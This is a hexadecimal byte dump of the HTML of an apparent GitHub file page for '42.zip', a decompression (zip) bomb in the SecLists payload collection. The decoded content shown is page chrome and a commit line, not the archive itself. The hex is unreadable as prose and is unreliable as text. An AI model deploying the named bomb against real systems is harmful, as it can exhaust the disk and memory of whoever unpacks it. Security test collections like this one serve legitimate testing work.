000a100 3348 3556 6d7a 2030 6833 5634 4837 7633
000a110 7a31 306d 3220 3468 3956 3348 3176 6d7a
000a120 3131 352d 2d68 7634 6831 5634 7a35 306d
000a130 3220 2d68 7634 6831 5634 7a37 306d 3220
000a140 2d68 7634 6831 5634 7a39 326d 362d 3976
000a150 3063 2e20 3535 2e2d 3534 3120 312d 3120
000a160 3948 352e 2d6c 2031 2d31 2d31 4831 6332
000a170 2e2d 3535 3020 312d 2e2d 3534 312d 312d
000a180 3356 3063 2e2d 3535 342e 2d35 2031 2d31
000a190 6831 2e35 6c35 2031 2031 2d31 4831 3531
000a1a0 2e63 3535 3020 3120 2e20 3534 3120 3120
000a1b0 6d7a 382d 2e20 4c35 2e37 2035 4833 7632
000a1c0 6839 5636 2e33 7a35 376d 2e2d 4835 2e39
000a1d0 6c35 2e2d 2e35 5635 3231 3668 3356 227a
000a1e0 3e2f 2f3c 7673 3e67 200a 2020 2020 5720
000a1f0 6b69 0a69 2f3c 3e61 200a 2020 3c20 2061
000a200 6c63 7361 3d73 6a22 2d73 6573 656c 7463
000a210 6465 6e2d 7661 6769 7461 6f69 2d6e 7469
000a220 6d65 7220 7065 6e6f 7661 692d 6574 226d
000a230 6420 7461 2d61 6573 656c 7463 6465 6c2d
000a240 6e69 736b 223d 6572 6f70 675f 6172 6870
000a250 2073 6572 6f70 635f 6e6f 7274 6269 7475
000a260 726f 2073 6564 6570 646e 6e65 7963 675f
000a270 6172 6870 7020 6c75 6573 7020 6f65 6c70
000a280 2065 6c61 7265 7374 2f20 6164 696e 6c65
000a290 696d 7365 6c73 7265 532f 6365 694c 7473
000a2a0 2f73 7570 736c 2265 6820 6572 3d66 2f22
000a2b0 6164 696e 6c65 696d 7365 6c73 7265 532f
000a2c0 6365 694c 7473 2f73 7570 736c 2265 0a3e
000a2d0 2020 2020 2020 733c 6776 6320 616c 7373
000a2e0 223d 636f 6974 6f63 206e 636f 6974 6f63
000a2f0 2d6e 7267 7061 2268 7620 6569 4277 786f
000a300 223d 2030 2030 3631 3120 2236 7620 7265
000a310 6973 6e6f 223d 2e31 2231 7720 6469 6874
000a320 223d 3631 2022 6568 6769 7468 223d 3631
000a330 2022 7261 6169 682d 6469 6564 3d6e 7422
000a340 7572 2265 3c3e 6170 6874 6620 6c69 2d6c
000a350 7572 656c 223d 7665 6e65 646f 2264 6420
000a360 223d 314d 2036 3431 3176 3048 3056 3168
000a370 3176 6834 3531 4d7a 2035 3331 3348 3856
000a380 3268 3576 6d7a 2034 4830 5637 6833 7632
000a390 3031 6d7a 2034 6830 322d 3656 3268 3776
000a3a0 227a 3e2f 2f3c 7673 3e67 200a 2020 2020
000a3b0 4920 736e 6769 7468 0a73 2f3c 3e61 0a0a
000a3c0 2f3c 616e 3e76 0a0a 200a 3c20 642f 7669
000a3d0 0a3e 643c 7669 6320 616c 7373 223d 6f63
000a3e0 746e 6961 656e 2072 656e 2d77 6964 6373
000a3f0 7375 6973 6e6f 742d 6d69 6c65 6e69 2065
000a400 7865 6570 6972 656d 746e 722d 7065 2d6f
000a410 616e 2076 2220 0a3e 2020 643c 7669 6320
000a420 616c 7373 223d 6572 6f70 6973 6f74 7972
000a430 632d 6e6f 6574 746e 2220 0a3e 200a 2020
000a440 0a20 2020 2020 0a0a 0a0a 2020 200a 2020
000a450 3c20 2061 6c63 7361 3d73 6422 6e2d 6e6f
000a460 2065 736a 702d 7265 616d 696c 6b6e 732d
000a470 6f68 7472 7563 2274 6420 7461 2d61 6f68
000a480 6b74 7965 223d 2279 6820 6572 3d66 2f22
000a490 6164 696e 6c65 696d 7365 6c73 7265 532f
000a4a0 6365 694c 7473 2f73 6c62 626f 312f 3138
000a4b0 6462 3437 6533 3362 6635 6135 3130 6238
000a4c0 3630 3163 6532 3336 6632 6563 3563 3933
000a4d0 6665 3137 2f32 6150 6c79 616f 7364 5a2f
000a4e0 7069 422d 6d6f 7362 342f 2e32 697a 2270
000a4f0 503e 7265 616d 696c 6b6e 2f3c 3e61 0a0a
000a500 2020 2020 213c 2d2d 6220 6f6c 2062 6f63
000a510 746e 6972 2062 656b 3a79 6220 6f6c 5f62
000a520 6f63 746e 6972 7562 6f74 7372 763a 3132
000a530 643a 3063 6534 6530 6639 3537 6666 6461
000a540 6130 3635 3537 3236 6236 3164 6134 3466
000a550 2035 2d2d 0a3e 2020 2020 2020 2020 2020
000a560 643c 7669 6320 616c 7373 223d 6973 6e67
000a570 7075 702d 6f72 706d 2d74 6762 7220 756f
000a580 646e 6465 312d 3e22 200a 2020 2020 3c20
000a590 6964 2076 6c63 7361 3d73 7322 6769 756e
000a5a0 2d70 7270 6d6f 7470 7020 342d 7420 7865
000a5b0 2d74 6563 746e 7265 6d20 2d62 2034 6f72
000a5c0 6e75 6564 2d64 2231 0a3e 2020 2020 2020
000a5d0 2020 643c 7669 6320 616c 7373 223d 6f70
000a5e0 6973 6974 6e6f 722d 6c65 7461 7669 2265
000a5f0 0a3e 2020 2020 2020 2020 2020 213c 2d2d
000a600 2720 6022 2d20 3e2d 213c 2d2d 3c20 742f
000a610 7865 6174 6572 3e61 2f3c 6d78 3e70 2d20
000a620 3e2d 2f3c 706f 6974 6e6f 3c3e 662f 726f
000a630 3e6d 663c 726f 206d 6361 6974 6e6f 223d
000a640 702f 6f72 706d 5f74 6964 6d73 7369 6173
000a650 736c 732f 6769 756e 2270 6120 6363 7065
000a660 2d74 6863 7261 6573 3d74 5522 4654 382d
000a670 2022 656d 6874 646f 223d 6f70 7473 3e22
000a680 693c 706e 7475 6e20 6d61 3d65 7522 6674
000a690 2238 7420 7079 3d65 6822 6469 6564 226e
000a6a0 7620 6c61 6575 223d 2326 3278 3137 3b33
000a6b0 2022 3e2f 693c 706e 7475 7420 7079 3d65
000a6c0 6822 6469 6564 226e 6e20 6d61 3d65 5f22
000a6d0 656d 6874 646f 2022 6176 756c 3d65 7022
000a6e0 7475 2022 3e2f 693c 706e 7475 7420 7079
000a6f0 3d65 6822 6469 6564 226e 6e20 6d61 3d65
000a700 6122 7475 6568 746e 6369 7469 5f79 6f74
000a710 656b 226e 7620 6c61 6575 223d 4769 7834
000a720 7539 6c32 797a 7467 6250 4d54 725a 2f41
000a730 4453 3842 644b 5237 3378 5337 5151 706a
000a740 556a 6a78 4c4b 5358 5762 6a37 4977 6e34
000a750 4277 376a 3666 4967 704f 5a49 2b71 502b
000a760 7147 596a 5476 7572 556a 557a 6b34 3058
000a770 7778 3d3d 2022 3e2f 200a 2020 2020 2020
000a780 2020 2020 3c20 7562 7474 6e6f 7420 7079
000a790 3d65 7322 6275 696d 2274 6320 616c 7373
000a7a0 223d 6f70 6973 6974 6e6f 612d 7362 6c6f
000a7b0 7475 2065 6f74 2d70 2030 6972 6867 2d74
000a7c0 2030 7462 2d6e 696c 6b6e 6c20 6e69 2d6b
000a7d0 7267 7961 2022 6164 6174 672d 2d61 6c63
000a7e0 6369 3d6b 2822 6f4c 6767 6465 6f20 7475
000a7f0 2029 6953 6e67 7520 2070 7270 6d6f 7470
000a800 202c 6c63 6369 656b 2064 6944 6d73 7369
000a810 2c73 7420 7865 3a74 6964 6d73 7369 2273
000a820 0a3e 2020 2020 2020 2020 2020 2020 2020
000a830 6944 6d73 7369 0a73 2020 2020 2020 2020
000a840 2020 2020 2f3c 7562 7474 6e6f 0a3e 2f3c
000a850 6f66 6d72 203e 2020 2020 2020 2020 3c20
000a860 3368 6320 616c 7373 223d 7470 322d 3e22
000a870 6f4a 6e69 4720 7469 7548 2062 6f74 6164
000a880 3c79 682f 3e33 200a 2020 2020 2020 2020
000a890 3c20 2070 6c63 7361 3d73 6322 6c6f 362d
000a8a0 6d20 2d78 7561 6f74 3e22 6947 4874 6275
000a8b0 6920 2073 6f68 656d 7420 206f 766f 7265
000a8c0 3320 2036 696d 6c6c 6f69 206e 6564 6576
000a8d0 6f6c 6570 7372 7720 726f 696b 676e 7420
000a8e0 676f 7465 6568 2072 6f74 6820 736f 2074
000a8f0 6e61 2064 6572 6976 7765 6320 646f 2c65
000a900 6d20 6e61 6761 2065 7270 6a6f 6365 7374
000a910 202c 6e61 2064 7562 6c69 2064 6f73 7466
000a920 6177 6572 7420 676f 7465 6568 2e72 2f3c
000a930 3e70 200a 2020 2020 2020 2020 3c20 2061
000a940 6c63 7361 3d73 6222 6e74 6220 6e74 702d
000a950 6972 616d 7972 2022 6164 6174 682d 6479
000a960 6f72 632d 696c 6b63 223d 267b 7571 746f
000a970 653b 6576 746e 745f 7079 2665 7571 746f
000a980 3a3b 7126 6f75 3b74 7561 6874 6e65 6974
000a990 6163 6974 6e6f 632e 696c 6b63 7126 6f75
000a9a0 3b74 262c 7571 746f 703b 7961 6f6c 6461
000a9b0 7126 6f75 3b74 7b3a 7126 6f75 3b74 6f6c
000a9c0 6163 6974 6e6f 695f 5f6e 6170 6567 7126
000a9d0 6f75 3b74 263a 7571 746f 663b 6c69 7365
000a9e0 7320 6769 756e 2070 7270 6d6f 7470 7126
000a9f0 6f75 3b74 262c 7571 746f 723b 7065 736f
000aa00 7469 726f 5f79 6469 7126 6f75 3b74 6e3a
000aa10 6c75 2c6c 7126 6f75 3b74 7561 6874 745f
000aa20 7079 2665 7571 746f 3a3b 7126 6f75 3b74
000aa30 4953 4e47 555f 2650 7571 746f 2c3b 7126
000aa40 6f75 3b74 6c63 6569 746e 695f 2664 7571
000aa50 746f 3a3b 756e 6c6c 262c 7571 746f 6f3b
000aa60 6972 6967 616e 6974 676e 725f 7165 6575
000aa70 7473 695f 2664 7571 746f 3a3b 7126 6f75
000aa80 3b74 4143 3737 373a 4538 3a34 3034 3035
000aa90 3131 363a 3143 4636 3a32 4335 4343 4245
000aaa0 4637 7126 6f75 3b74 262c 7571 746f 6f3b
000aab0 6972 6967 616e 6974 676e 755f 6c72 7126
000aac0 6f75 3b74 263a 7571 746f 683b 7474 7370
000aad0 2f3a 672f 7469 7568 2e62 6f63 2f6d 6164
000aae0 696e 6c65 696d 7365 6c73 7265 532f 6365
000aaf0 694c 7473 2f73 6c62 626f 6d2f 7361 6574
000ab00 2f72 6150 6c79 616f 7364 5a2f 7069 422d
000ab10 6d6f 7362 342f 2e32 697a 2670 7571 746f
000ab20 2c3b 7126 6f75 3b74 6572 6566 7272 7265
000ab30 7126 6f75 3b74 6e3a 6c75 2c6c 7126 6f75
000ab40 3b74 7375 7265 695f 2664 7571 746f 3a3b
000ab50 756e 6c6c 7d7d 2022 6164 6174 682d 6479
000ab60 6f72 632d 696c 6b63 682d 616d 3d63 3022
000ab70 3238 6535 3831 6536 6636 3139 6332 6637
000ab80 3165 6434 3234 3036 3333 3831 3562 3634
000ab90 6237 6666 6262 6533 6166 6132 3163 3866
000aba0 6662 3237 3862 3333 6137 6336 6664 2261
000abb0 6420 7461 2d61 6167 632d 696c 6b63 223d
000abc0 4c28 676f 6567 2064 756f 2974 5320 6769
000abd0 206e 7075 7020 6f72 706d 2c74 6320 696c
000abe0 6b63 6465 5320 6769 206e 7075 202c 6574
000abf0 7478 733a 6769 2d6e 7075 2022 7268 6665
000ac00 223d 6a2f 696f 3f6e 6f73 7275 6563 703d
000ac10 6f72 706d 2d74 6c62 626f 732d 6f68 2277
000ac20 533e 6769 206e 7075 2f3c 3e61 200a 2020
000ac30 2020 2020 3c20 642f 7669 0a3e 2020 2020
000ac40 2020 2f3c 6964 3e76 200a 2020 3c20 642f
000ac50 7669 0a3e 0a0a 2020 2020 643c 7669 6320
000ac60 616c 7373 223d 2d64 6c66 7865 6620 656c
000ac70 2d78 7469 6d65 2d73 7473 7261 2074 626d
000ac80 332d 3e22 200a 2020 2020 3c20 7073 6e61
000ac90 6320 616c 7373 223d 2d64 6c66 7865 6620
000aca0 656c 2d78 756a 7473 6669 2d79 6562 7774
000acb0 6565 226e 0a3e 2020 2020 2020 2020 3c0a
000acc0 6564 6174 6c69 2073 6c63 7361 3d73 6422
000acd0 7465 6961 736c 722d 7365 7465 6420 7465
000ace0 6961 736c 6f2d 6576 6c72 7961 7320 6c65
000acf0 6365 2d74 656d 756e 6220 6172 636e 2d68
000ad00 6573 656c 7463 6d2d 6e65 2075 6820 5f78
000ad10 7372 226d 6920 3d64 6222 6172 636e 2d68
000ad20 6573 656c 7463 6d2d 6e65 2275 0a3e 2020
000ad30 733c 6d75 616d 7972 6320 616c 7373 223d
000ad40 7462 206e 7462 2d6e 6d73 7320 6c65 6365
000ad50 2d74 656d 756e 622d 7475 6f74 206e 7363
000ad60 2d73 7274 6e75 6163 6574 0a22 2020 2020
000ad70 2020 2020 2020 6420 7461 2d61 6f68 6b74
000ad80 7965 223d 2277 200a 2020 2020 2020 2020
000ad90 2020 200a 2020 2020 2020 2020 2020 6974
000ada0 6c74 3d65 5322 6977 6374 2068 7262 6e61
000adb0 6863 7365 6f20 2072 6174 7367 3e22 200a
000adc0 2020 3c20 3e69 7242 6e61 6863 3c3a 692f
000add0 0a3e 2020 2020 733c 6170 206e 6c63 7361
000ade0 3d73 6322 7373 742d 7572 636e 7461 2d65
000adf0 6174 6772 7465 3e22 616d 7473 7265 2f3c
000ae00 7073 6e61 0a3e 2020 2f3c 7573 6d6d 7261
000ae10 3e79 0a0a 2020 643c 7465 6961 736c 6d2d
000ae20 6e65 2075 6c63 7361 3d73 7322 6c65 6365
000ae30 2d74 656d 756e 6d2d 646f 6c61 6820 5f78
000ae40 7372 2d6d 6f6d 6164 206c 6f70 6973 6974
000ae50 6e6f 612d 7362 6c6f 7475 2265 7320 7974
000ae60 656c 223d 2d7a 6e69 6564 3a78 3920 3b39
000ae70 2022 7273 3d63 2f22 6164 696e 6c65 696d
000ae80 7365 6c73 7265 532f 6365 694c 7473 2f73
000ae90 6572 2d66 696c 7473 6d2f 7361 6574 2f72
000aea0 6150 6c79 616f 7364 5a2f 7069 422d 6d6f
000aeb0 7362 342f 2e32 697a 3f70 6f73 7275 6563
000aec0 615f 7463 6f69 3d6e 6873 776f 6126 706d
000aed0 733b 756f 6372 5f65 6f63 746e 6f72 6c6c
000aee0 7265 623d 6f6c 2262 7020 6572 6f6c 6461
000aef0 0a3e 2020 2020 693c 636e 756c 6564 662d
000af00 6172 6d67 6e65 2074 6c63 7361 3d73 7322
000af10 6c65 6365 2d74 656d 756e 6c2d 616f 6964
000af20 676e 6f2d 6576 6c72 7961 6120 696e 2d6d
000af30 7570 736c 2265 0a3e 2020 2020 2020 733c
000af40 6776 6820 6965 6867 3d74 3322 2232 6320
000af50 616c 7373 223d 636f 6974 6f63 206e 636f
000af60 6974 6f63 2d6e 636f 6f74 6166 6563 2022
000af70 6976 7765 6f42 3d78 3022 3020 3120 2036
000af80 3631 2022 6576 7372 6f69 3d6e 3122 312e
000af90 2022 6977 7464 3d68 3322 2232 6120 6972
000afa0 2d61 6968 6464 6e65 223d 7274 6575 3e22
000afb0 703c 7461 2068 6966 6c6c 722d 6c75 3d65
000afc0 6522 6576 6f6e 6464 2022 3d64 4d22 3431
000afd0 372e 3520 332e 6334 312e 2d33 332e 2e32
000afe0 3535 312d 352e 2d39 312e 2d33 2e33 3133
000aff0 3020 3020 312d 302e 2d35 332e 2d33 2e33
000b000 3434 3120 332e 312d 2e2d 3832 322d 302e
000b010 2d37 332e 2d32 2e33 3331 2e2d 3233 2d73
000b020 2e32 3331 302e 2d34 2e33 3331 332e 6332
000b030 322d 332e 2d39 2e31 3436 332d 342e 2d34
000b040 2e31 2d33 2e33 3434 312d 332e 2e2d 3836
000b050 3120 372e 2d32 322e 2036 2e32 3939 2e2d
000b060 3331 3320 332e 4331 342e 2039 2e36 3132
000b070 3020 3720 332e 2033 2030 2e38 3936 3020
000b080 3120 2e33 3438 3320 332e 2033 3531 3720
000b090 392e 2038 3531 3153 2036 3331 382e 2034
000b0a0 3631 3820 362e 6339 2d30 2e31 3633 2e2d
000b0b0 3934 322d 342e 2d38 2e31 2d33 2e33 3533
000b0c0 4d7a 2038 3431 302e 6332 332d 332e 3020
000b0d0 352d 392e 2d38 312e 2d35 2e35 3839 332d
000b0e0 332e 2035 2d30 372e 2e36 3833 312d 342e
000b0f0 2038 2e31 3230 322d 302e 2037 2e31 3730
000b100 2e2d 3839 3220 392e 2e2d 3634 3420 392e
000b110 2d36 342e 2036 2e32 3730 3020 3320 382e
000b120 2d38 352e 2032 2e34 3639 342e 2e36 3536
000b130 352e 2039 2e31 3230 3120 332e 3120 302e
000b140 2032 2e32 3730 3020 3320 312e 2d39 2e32
000b150 3836 3320 332e 2d35 2e35 3839 3320 332e
000b160 7a35 354d 342e 2039 2e39 3130 2d63 362e
000b170 2036 2d30 2e31 2e32 2d38 2e31 2032 2e31
000b180 3837 2e73 3435 3120 372e 2039 2e31 2032
000b190 2e31 3937 2e63 3636 3020 3120 322e 2e2d
000b1a0 2038 2e31 2d32 2e31 3937 2d73 352e 2d34
000b1b0 2e31 3837 312d 322e 312d 372e 7a38 356d
000b1c0 302e 2032 6330 2e2d 3636 3020 312d 322e
000b1d0 372e 2d39 2e31 2032 2e31 3837 2e73 3435
000b1e0 3120 372e 2039 2e31 2032 2e31 3937 2e63
000b1f0 3636 3020 3120 322e 2e2d 2038 2e31 2d32
000b200 2e31 3937 2d73 352e 2d33 2e31 3837 312d
000b210 322e 312d 372e 7a38 2f22 3c3e 732f 6776
000b220 0a3e 2020 2020 2f3c 6e69 6c63 6475 2d65
000b230 7266 6761 656d 746e 0a3e 2020 2f3c 6564
000b240 6174 6c69 2d73 656d 756e 0a3e 2f3c 6564
000b250 6174 6c69 3e73 0a0a 2020 2020 2020 2020
000b260 643c 7669 6320 616c 7373 223d 7442 476e
000b270 6f72 7075 6620 656c 2d78 6873 6972 6b6e
000b280 302d 6420 6e2d 6e6f 2265 0a3e 2020 2020
000b290 2020 2020 2020 613c 6820 6572 3d66 2f22
000b2a0 6164 696e 6c65 696d 7365 6c73 7265 532f
000b2b0 6365 694c 7473 2f73 6966 646e 6d2f 7361
000b2c0 6574 2272 200a 2020 2020 2020 2020 2020
000b2d0 2020 2020 6320 616c 7373 223d 736a 702d
000b2e0 616a 2d78 6163 7470 7275 2d65 6e69 7570
000b2f0 2074 7462 206e 7462 2d6e 6d73 4220 6e74
000b300 7247 756f 2d70 7469 6d65 0a22 2020 2020
000b310 2020 2020 2020 2020 2020 2020 6164 6174
000b320 702d 616a 0a78 2020 2020 2020 2020 2020
000b330 2020 2020 2020 6164 6174 682d 746f 656b
000b340 3d79 7422 3e22 200a 2020 2020 2020 2020
000b350 2020 4620 6e69 2064 6966 656c 200a 2020
000b360 2020 2020 2020 3c20 612f 0a3e 2020 2020
000b370 2020 2020 2020 633c 696c 6270 616f 6472
000b380 632d 706f 2079 6176 756c 3d65 5022 7961
000b390 6f6c 6461 2f73 695a 2d70 6f42 626d 2f73
000b3a0 3234 7a2e 7069 2022 6c63 7361 3d73 6222
000b3b0 6e74 6220 6e74 732d 206d 7442 476e 6f72
000b3c0 7075 692d 6574 226d 0a3e 2020 2020 2020
000b3d0 2020 2020 2020 6f43 7970 7020 7461 0a68
000b3e0 2020 2020 2020 2020 2020 2f3c 6c63 7069
000b3f0 6f62 7261 2d64 6f63 7970 0a3e 2020 2020
000b400 2020 2020 2f3c 6964 3e76 200a 2020 2020
000b410 3c20 732f 6170 3e6e 200a 2020 2020 3c20
000b420 3268 6920 3d64 6222 6f6c 2d62 6170 6874
000b430 2022 6c63 7361 3d73 6222 6572 6461 7263
000b440 6d75 2062 6c66 7865 612d 7475 206f 696d
000b450 2d6e 6977 7464 2d68 2030 6574 7478 6e2d
000b460 726f 616d 206c 6c6d 322d 6d20 2d72 2233
000b470 0a3e 2020 2020 2020 2020 733c 6170 206e
000b480 6c63 7361 3d73 6a22 2d73 6572 6f70 722d
000b490 6f6f 2074 6574 7478 622d 6c6f 2264 3c3e
000b4a0 7073 6e61 6320 616c 7373 223d 736a 702d
000b4b0 7461 2d68 6573 6d67 6e65 2274 3c3e 2061
000b4c0 6164 6174 702d 616a 3d78 7422 7572 2265
000b4d0 6820 6572 3d66 2f22 6164 696e 6c65 696d
000b4e0 7365 6c73 7265 532f 6365 694c 7473 2273
000b4f0 3c3e 7073 6e61 533e 6365 694c 7473 3c73
000b500 732f 6170 3e6e 2f3c 3e61 2f3c 7073 6e61
000b510 3c3e 732f 6170 3e6e 733c 6170 206e 6c63
000b520 7361 3d73 7322 7065 7261 7461 726f 3e22
000b530 3c2f 732f 6170 3e6e 733c 6170 206e 6c63
000b540 7361 3d73 6a22 2d73 6170 6874 732d 6765
000b550 656d 746e 3e22 613c 6420 7461 2d61 6a70
000b560 7861 223d 7274 6575 2022 7268 6665 223d
000b570 642f 6e61 6569 6d6c 6569 7373 656c 2f72
000b580 6553 4c63 7369 7374 742f 6572 2f65 616d
000b590 7473 7265 502f 7961 6f6c 6461 2273 3c3e
000b5a0 7073 6e61 503e 7961 6f6c 6461 3c73 732f
000b5b0 6170 3e6e 2f3c 3e61 2f3c 7073 6e61 3c3e
000b5c0 7073 6e61 6320 616c 7373 223d 6573 6170
000b5d0 6172 6f74 2272 2f3e 2f3c 7073 6e61 3c3e
000b5e0 7073 6e61 6320 616c 7373 223d 736a 702d
000b5f0 7461 2d68 6573 6d67 6e65 2274 3c3e 2061
000b600 6164 6174 702d 616a 3d78 7422 7572 2265
000b610 6820 6572 3d66 2f22 6164 696e 6c65 696d
000b620 7365 6c73 7265 532f 6365 694c 7473 2f73
000b630 7274 6565 6d2f 7361 6574 2f72 6150 6c79
000b640 616f 7364 5a2f 7069 422d 6d6f 7362 3e22
000b650 733c 6170 3e6e 695a 2d70 6f42 626d 3c73
000b660 732f 6170 3e6e 2f3c 3e61 2f3c 7073 6e61
000b670 3c3e 7073 6e61 6320 616c 7373 223d 6573
000b680 6170 6172 6f74 2272 2f3e 2f3c 7073 6e61
000b690 3c3e 7473 6f72 676e 6320 616c 7373 223d
000b6a0 6966 616e 2d6c 6170 6874 3e22 3234 7a2e
000b6b0 7069 2f3c 7473 6f72 676e 0a3e 2020 2020
000b6c0 2020 2f3c 3268 0a3e 200a 2020 2020 3c20
000b6d0 6964 2076 6c63 7361 3d73 4222 6e74 7247
000b6e0 756f 2070 6c66 7865 732d 7268 6e69 2d6b
000b6f0 2030 2d64 6e69 696c 656e 622d 6f6c 6b63
000b700 3e22 200a 2020 2020 2020 3c20 2061 7268
000b710 6665 223d 642f 6e61 6569 6d6c 6569 7373
000b720 656c 2f72 6553 4c63 7369 7374 662f 6e69
000b730 2f64 616d 7473 7265 0a22 2020 2020 2020
000b740 2020 2020 2020 2020 6c63 7361 3d73 6a22
000b750 2d73 6a70 7861 632d 7061 7574 6572 692d
000b760 706e 7475 6220 6e74 6220 6e74 732d 206d
000b770 7442 476e 6f72 7075 692d 6574 226d 200a
000b780 2020 2020 2020 2020 2020 2020 6420 7461
000b790 2d61 6a70 7861 200a 2020 2020 2020 2020
000b7a0 2020 2020 6420 7461 2d61 6f68 6b74 7965
000b7b0 223d 2274 0a3e 2020 2020 2020 2020 2020
000b7c0 6946 646e 6620 6c69 0a65 2020 2020 2020
000b7d0 2020 2f3c 3e61 200a 2020 2020 2020 3c20
000b7e0 6c63 7069 6f62 7261 2d64 6f63 7970 7620
000b7f0 6c61 6575 223d 6150 6c79 616f 7364 5a2f
000b800 7069 422d 6d6f 7362 342f 2e32 697a 2270
000b810 6320 616c 7373 223d 7462 206e 7462 2d6e
000b820 6d73 4220 6e74 7247 756f 2d70 7469 6d65
000b830 3e22 200a 2020 2020 2020 2020 4320 706f
000b840 2079 6170 6874 200a 2020 2020 2020 3c20
000b850 632f 696c 6270 616f 6472 632d 706f 3e79
000b860 200a 2020 2020 3c20 642f 7669 0a3e 2020
000b870 2020 2f3c 6964 3e76 0a0a 0a0a 2020 2020
000b880 200a 3c20 6964 2076 6c63 7361 3d73 4222
000b890 786f 4220 786f 2d2d 6f63 646e 6e65 6573
000b8a0 2064 2d64 6c66 7865 6620 656c 2d78 6f63
000b8b0 756c 6e6d 6620 656c 2d78 6873 6972 6b6e
000b8c0 302d 3e22 200a 2020 2020 3c20 6964 2076
000b8d0 6c63 7361 3d73 4222 786f 622d 646f 2079
000b8e0 2d64 6c66 7865 6620 656c 2d78 756a 7473
000b8f0 6669 2d79 6562 7774 6565 206e 6762 622d
000b900 756c 2d65 696c 6867 2074 6c66 7865 692d
000b910 6574 736d 632d 6e65 6574 2272 0a3e 2020
000b920 2020 2020 2020 733c 6170 206e 6c63 7361
000b930 3d73 7022 2d72 646d 342d 6620 2236 0a3e
000b940 2020 2020 2020 2020 2020 613c 7220 6c65
000b950 223d 6f63 746e 6972 7562 6f74 2272 6420
000b960 7461 2d61 6b73 7069 702d 616a 3d78 7422
000b970 7572 2265 6420 7461 2d61 6f68 6576 6372
000b980 7261 2d64 7974 6570 223d 7375 7265 2022
000b990 6164 6174 682d 766f 7265 6163 6472 752d
000b9a0 6c72 223d 682f 766f 7265 6163 6472 3f73
000b9b0 7375 7265 695f 3d64 3335 3935 3234 2022
000b9c0 6164 6174 6f2d 7463 2d6f 6c63 6369 3d6b
000b9d0 6822 766f 7265 6163 6472 6c2d 6e69 2d6b
000b9e0 6c63 6369 226b 6420 7461 2d61 636f 6f74
000b9f0 642d 6d69 6e65 6973 6e6f 3d73 6c22 6e69
000ba00 5f6b 7974 6570 733a 6c65 2266 6820 6572
000ba10 3d66 2f22 3067 6d74 3169 226b 3c3e 6d69
000ba20 2067 6c63 7361 3d73 6122 6176 6174 2272
000ba30 7320 6372 223d 7468 7074 3a73 2f2f 7661
000ba40 7461 7261 3273 672e 7469 7568 7562 6573
000ba50 6372 6e6f 6574 746e 632e 6d6f 752f 352f
000ba60 3533 3439 3f32 3d73 3034 6126 706d 763b
000ba70 343d 2022 6977 7464 3d68 3222 2230 6820
000ba80 6965 6867 3d74 3222 2230 6120 746c 223d
000ba90 6740 7430 696d 6b31 2022 3e2f 2f3c 3e61
000baa0 200a 2020 2020 2020 2020 3c20 2061 6c63
000bab0 7361 3d73 7422 7865 2d74 6f62 646c 6c20
000bac0 6e69 2d6b 7267 7961 642d 7261 206b 686c
000bad0 642d 6665 7561 746c 7620 612d 696c 6e67
000bae0 6d2d 6469 6c64 2265 7220 6c65 223d 6f63
000baf0 746e 6972 7562 6f74 2272 6420 7461 2d61
000bb00 6f68 6576 6372 7261 2d64 7974 6570 223d
000bb10 7375 7265 2022 6164 6174 682d 766f 7265
000bb20 6163 6472 752d 6c72 223d 682f 766f 7265
000bb30 6163 6472 3f73 7375 7265 695f 3d64 3335
000bb40 3935 3234 2022 6164 6174 6f2d 7463 2d6f
000bb50 6c63 6369 3d6b 6822 766f 7265 6163 6472
000bb60 6c2d 6e69 2d6b 6c63 6369 226b 6420 7461
000bb70 2d61 636f 6f74 642d 6d69 6e65 6973 6e6f
000bb80 3d73 6c22 6e69 5f6b 7974 6570 733a 6c65
000bb90 2266 6820 6572 3d66 2f22 3067 6d74 3169
000bba0 226b 673e 7430 696d 6b31 2f3c 3e61 200a
000bbb0 2020 2020 2020 2020 2020 3c20 7073 6e61
000bbc0 6320 616c 7373 223d 686c 642d 6665 7561
000bbd0 746c 7620 612d 696c 6e67 6d2d 6469 6c64
000bbe0 2265 0a3e 2020 2020 2020 2020 2020 2020
000bbf0 2020 733c 6170 206e 6c63 7361 3d73 6922
000bc00 7373 6575 6b2d 7965 6f77 6472 7420 6f6f
000bc10 746c 7069 6570 2064 6f74 6c6f 6974 7070
000bc20 6465 732d 2265 6120 6972 2d61 616c 6562
000bc30 3d6c 5422 6968 2073 6f63 6d6d 7469 6320
000bc40 6f6c 6573 2073 7369 7573 2065 3223 3935
000bc50 222e 3c3e 2061 6164 6174 702d 616a 3d78
000bc60 7422 7572 2265 7420 7469 656c 223d 6946
000bc70 2078 3223 3935 2d20 5220 6365 766f 7265
000bc80 6620 6f72 206d 6162 2064 656d 6772 2265
000bc90 6320 616c 7373 223d 696c 6b6e 672d 6172
000bca0 2279 6820 6572 3d66 2f22 6164 696e 6c65
000bcb0 696d 7365 6c73 7265 532f 6365 694c 7473
000bcc0 2f73 6f63 6d6d 7469 352f 3165 6364 6339
000bcd0 3763 6139 6361 3435 3362 3337 3433 6539
000bce0 6132 3739 6262 3262 6632 6231 3336 6262
000bcf0 2233 463e 7869 2f3c 3e61 2f3c 7073 6e61
000bd00 203e 613c 6320 616c 7373 223d 7369 7573
000bd10 2d65 696c 6b6e 6a20 2d73 7369 7573 2d65
000bd20 696c 6b6e 2022 6164 6174 652d 7272 726f
000bd30 742d 7865 3d74 4622 6961 656c 2064 6f74
000bd40 6c20 616f 2064 7369 7573 2065 6974 6c74
000bd50 2265 6420 7461 2d61 6469 223d 3933 3835
000bd60 3039 3139 2234 6420 7461 2d61 6570 6d72
000bd70 7369 6973 6e6f 742d 7865 3d74 4922 7373
000bd80 6575 7420 7469 656c 6920 2073 7270 7669
000bd90 7461 2265 6420 7461 2d61 7275 3d6c 6822
000bda0 7474 7370 2f3a 672f 7469 7568 2e62 6f63
000bdb0 2f6d 6164 696e 6c65 696d 7365 6c73 7265
000bdc0 532f 6365 694c 7473 2f73 7369 7573 7365
000bdd0 322f 3935 2022 6164 6174 682d 766f 7265
000bde0 6163 6472 742d 7079 3d65 6922 7373 6575
000bdf0 2022 6164 6174 682d 766f 7265 6163 6472
000be00 752d 6c72 223d 642f 6e61 6569 6d6c 6569
000be10 7373 656c 2f72 6553 4c63 7369 7374 692f
000be20 7373 6575 2f73 3532 2f39 6f68 6576 6372
000be30 7261 2264 6820 6572 3d66 6822 7474 7370
000be40 2f3a 672f 7469 7568 2e62 6f63 2f6d 6164
000be50 696e 6c65 696d 7365 6c73 7265 532f 6365
000be60 694c 7473 2f73 7369 7573 7365 322f 3935
000be70 3e22 3223 3935 2f3c 3e61 3c20 2061 6164
